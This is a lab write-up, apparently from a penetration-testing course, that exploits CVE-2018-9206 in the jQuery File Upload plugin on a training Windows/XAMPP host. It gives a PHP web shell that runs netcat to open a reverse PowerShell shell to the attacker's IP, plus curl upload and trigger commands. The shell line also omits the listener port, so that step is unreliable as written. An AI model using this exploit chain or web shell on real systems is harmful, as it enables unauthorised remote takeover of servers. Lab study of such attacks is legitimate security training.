# XOR-App59 (10.11.1.123)
***
## Enumeration
1. Enumerate running services using `nmap`
```
nmap -sV -sC -Pn 10.11.1.123
```

2. `nmap` was able to detect several running services, but for this machine, the area of interest is the **Apache** web server running on port **80**
``` 
80/tcp   open  http          Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.5)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.5
| http-title: Welcome to XAMPP
|_Requested resource was http://10.11.1.123/dashboard/
```

3. We performed a directory enumeration and discovered a directory called `/books` which shows a login page for an Accounting app.
![[xor-books.png]]

4. We checked on the source code of `http://10.11.1.123/books` and found a referenced to sub-directories called `/lib`, `/app` and `/portal`   
![[xor-subdir.png]]

5. We checked the content of `http://10.11.1.123/books/apps/` directory and found an interesting [jQuery plugin](https://github.com/blueimp/jQuery-File-Upload) called [`jQuery File Upload Plugin`](http://10.11.1.123/books/apps/jquery-file-upload/js/jquery.fileupload.js) by **BlueImp**
![[file-uploader.png]]

6. We searched for publicly disclosed vulnerabilties for `jQuery File Upload Plugin` and we found out that it has [unauthenticated arbitrary file upload vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2018-9206) affecting **v9.22.0 and lower versions** of that plugin.
> [!info] 
> [**CVE-2018-9206**](https://nvd.nist.gov/vuln/detail/CVE-2018-9206) - Unauthenticated arbitrary file upload vulnerability in Blueimp jQuery-File-Upload <= v9.22.0 
***
## Exploitation
> [!info] 
> Since the target is running an Apache web server (that means it uses `PHP` as programming language), and we have a way to upload any files (with any extensions). We will going to upload a PHP shell to execute OS commands and take control of the target. 

1. First, we need to download `netcat` executable. You can get it from [here](https://github.com/int0x33/nc.exe/raw/master/nc.exe).
```
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
```

2. We create a simple PHP shell to which runs our back-connect. Save it as `shell.php
   
``` php
<?php system('nc.exe KALI_IP -e powershell');?>
```
> [!note] 
> Replace the `KALI_IP` with your Kali's IP address    

3. Upload our downloaded `netcat` executable using the following command   
``` 
curl -F "files=@nc.exe" http://10.11.1.123/books/apps/jquery-file-upload/server/php/index.php
```

4. Upload our PHP shell using the following command
```
curl -F "files=@shell.php" http://10.11.1.123/books/apps/jquery-file-upload/server/php/index.php
```  
   
5. Start a `netcat` listener on port **9001**
```
nc -lvnp 9001
```

6. Execute the shell 
```
curl http://10.11.1.123/books/apps/jquery-file-upload/server/php/files/shell.php
```

7. You should get a reverse shell(powershell) running as `nt authority\system` 
![[xor-whoami.png]]
***
## Post-exploitation
1. Since the shell we have is already running as `nt authority\system`, we will now be able to read the flag.   
![[xor-app59-proof.png]]   
   